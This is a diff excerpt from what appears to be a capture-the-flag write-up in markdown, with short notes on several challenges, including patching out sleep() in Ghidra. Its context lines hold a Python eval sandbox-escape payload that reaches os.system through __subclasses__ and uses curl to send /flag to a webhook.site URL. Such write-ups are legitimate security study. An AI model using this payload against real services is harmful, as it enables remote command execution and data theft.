@@ -14,18 +14,22 @@ hidden: false
 {"expression":"eval(data['test'])",
 "test":"''.__class__.__base__.__subclasses__()[154].__init__.__globals__['system']('curl https://webhook.site/49d52fa6-4db9-4ad8-8b6e-ee41224137b0 -d $(cat /flag)')"}
 ```
+
 ![](/images/2024/05/SkywNWyVC.png)
+
 ![](/images/2024/05/rJmON-1VC.png)
 
 
 ### The Long Print
 
 - 用ghidra patch掉sleep()
+
 ![](/images/2024/05/S1fflXJE0.png)
 
 ### Three Dimensional Secret
 
 https://nraynaud.github.io/webgcode/
+
 ![](/images/2024/05/r1cc57kVA.png)
 
 ### Quantum Nim Heist
